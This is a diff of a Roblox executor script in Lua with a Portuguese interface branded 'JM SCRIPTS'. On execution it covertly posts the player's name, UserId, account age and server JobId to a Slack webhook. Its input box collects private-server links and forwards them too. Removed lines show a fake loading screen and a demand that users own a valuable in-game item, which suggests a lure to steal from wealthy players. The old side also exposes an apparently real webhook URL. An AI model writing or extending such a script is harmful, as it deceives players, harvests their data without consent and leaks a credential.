@@ -1,7 +1,7 @@
 --========================
 -- CONFIG
 --========================
-local WEBHOOK_URL = "https://hooks.slack.com/services/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"
+local WEBHOOK_URL = "COLE_SEU_WEBHOOK_SLACK_AQUI"
 
 --========================
 -- SERVICES
@@ -9,6 +9,7 @@ local WEBHOOK_URL = "https://hooks.slack.com/services/T0AK1TWSSQP/B0AKM06HSSY/bg
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
+
 local player = Players.LocalPlayer
 
 local request =
@@ -21,19 +22,37 @@ local request =
 -- WEBHOOK FUNCTION
 --========================
 local function sendWebhook(msg)
-    if not request then return end
+
+    if not request then
+        warn("Executor não suporta request")
+        return
+    end
+
+    local data = {
+        text = msg
+    }
+
     request({
         Url = WEBHOOK_URL,
         Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode({text = msg})
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(data)
     })
+
 end
 
 --========================
--- LOG EXECUTION
+-- EXECUTION LOG
 --========================
-sendWebhook("🚀 SCRIPT EXECUTADO\n👤 Usuário: "..player.Name)
+sendWebhook(
+"🚀 SCRIPT EXECUTADO\n"..
+"👤 Player: "..player.Name.."\n"..
+"🆔 UserId: "..player.UserId.."\n"..
+"📅 AccountAge: "..player.AccountAge.."\n"..
+"🌍 JobId: "..game.JobId
+)
 
 --========================
 -- GUI BASE
@@ -60,41 +79,14 @@ introText.TextTransparency = 1
 introText.Text = "Obrigado por usar\nJM SCRIPTS 💜"
 
 TweenService:Create(introText,TweenInfo.new(1),{TextTransparency=0}):Play()
+
 task.wait(2.5)
+
 TweenService:Create(introText,TweenInfo.new(1),{TextTransparency=1}):Play()
+
 task.wait(1)
+
 intro:Destroy()
-
---========================
--- LOADING FAKE
---========================
-local loading = Instance.new("Frame", gui)
-loading.Size = UDim2.fromScale(1,1)
-loading.BackgroundColor3 = Color3.fromRGB(5,5,10)
-
-local lText = Instance.new("TextLabel", loading)
-lText.Size = UDim2.fromScale(1,0.15)
-lText.Position = UDim2.fromScale(0,0.35)
-lText.BackgroundTransparency = 1
-lText.TextScaled = true
-lText.Font = Enum.Font.Gotham
-lText.TextColor3 = Color3.fromRGB(200,160,255)
-lText.Text = "Carregando sistema..."
-
-local barBg = Instance.new("Frame", loading)
-barBg.Size = UDim2.fromScale(0.6,0.03)
-barBg.Position = UDim2.fromScale(0.2,0.52)
-barBg.BackgroundColor3 = Color3.fromRGB(30,30,50)
-Instance.new("UICorner", barBg).CornerRadius = UDim.new(1,0)
-
-local bar = Instance.new("Frame", barBg)
-bar.Size = UDim2.fromScale(0,1)
-bar.BackgroundColor3 = Color3.fromRGB(170,90,255)
-Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)
-
-TweenService:Create(bar,TweenInfo.new(6),{Size=UDim2.fromScale(0.95,1)}):Play()
-task.wait(7)
-loading:Destroy()
 
 --========================
 -- MAIN UI
@@ -107,34 +99,18 @@ local stroke = Instance.new("UIStroke", main)
 stroke.Thickness = 2
 
 task.spawn(function()
+
     local t = 0
+
     while main.Parent do
+
         t += 0.01
         stroke.Color = Color3.fromHSV(t%1,0.6,1)
-        task.wait()
-    end
-end)
 
---========================
--- SPARKS
---========================
-local sparks = Instance.new("Folder", main)
-task.spawn(function()
-    while main.Parent do
-        local s = Instance.new("Frame", sparks)
-        s.Size = UDim2.fromScale(0.003,0.02)
-        s.Position = UDim2.fromScale(math.random(),1.1)
-        s.BackgroundColor3 = Color3.fromRGB(180,90,255)
-        s.BackgroundTransparency = 0.2
-        Instance.new("UICorner", s).CornerRadius = UDim.new(1,0)
-        TweenService:Create(
-            s,
-            TweenInfo.new(math.random(3,6),Enum.EasingStyle.Linear),
-            {Position = UDim2.fromScale(s.Position.X.Scale,-0.2),BackgroundTransparency=1}
-        ):Play()
-        task.delay(6,function() s:Destroy() end)
-        task.wait(0.15)
+        task.wait()
+
     end
+
 end)
 
 --========================
@@ -149,18 +125,6 @@ title.TextScaled = true
 title.TextColor3 = Color3.fromRGB(190,140,255)
 
 --========================
--- RULE
---========================
-local rule = Instance.new("TextLabel", main)
-rule.Position = UDim2.fromScale(0.1,0.18)
-rule.Size = UDim2.fromScale(0.8,0.07)
-rule.BackgroundTransparency = 1
-rule.TextScaled = true
-rule.Font = Enum.Font.Gotham
-rule.TextColor3 = Color3.fromRGB(255,90,90)
-rule.Text = "⚠️ OBRIGATÓRIO: ter pelo menos 1 Brainrot de 10M+"
-
---========================
 -- INPUT
 --========================
 local box = Instance.new("TextBox", main)
@@ -171,8 +135,8 @@ box.TextScaled = true
 box.Font = Enum.Font.Gotham
 box.BackgroundColor3 = Color3.fromRGB(20,20,35)
 box.TextColor3 = Color3.new(1,1,1)
+
 Instance.new("UICorner", box).CornerRadius = UDim.new(0,14)
-Instance.new("UIStroke", box).Color = Color3.fromRGB(150,90,230)
 
 --========================
 -- SEND BUTTON
@@ -180,15 +144,26 @@ Instance.new("UIStroke", box).Color = Color3.fromRGB(150,90,230)
 local send = Instance.new("TextButton", main)
 send.Position = UDim2.fromScale(0.35,0.47)
 send.Size = UDim2.fromScale(0.3,0.08)
+
 send.Text = "Enviar"
 send.TextScaled = true
 send.Font = Enum.Font.GothamSemibold
+
 send.BackgroundColor3 = Color3.fromRGB(140,70,220)
 send.TextColor3 = Color3.new(1,1,1)
+
 Instance.new("UICorner", send).CornerRadius = UDim.new(0,16)
 
 send.MouseButton1Click:Connect(function()
+
     if box.Text == "" then return end
-    sendWebhook("🔗 Server Privado Enviado\n👤 "..player.Name.."\n📎 "..box.Text)
+
+    sendWebhook(
+    "🔗 SERVER PRIVADO\n"..
+    "👤 "..player.Name.."\n"..
+    "📎 "..box.Text
+    )
+
     send.Text = "Enviado ✔"
+
 end)
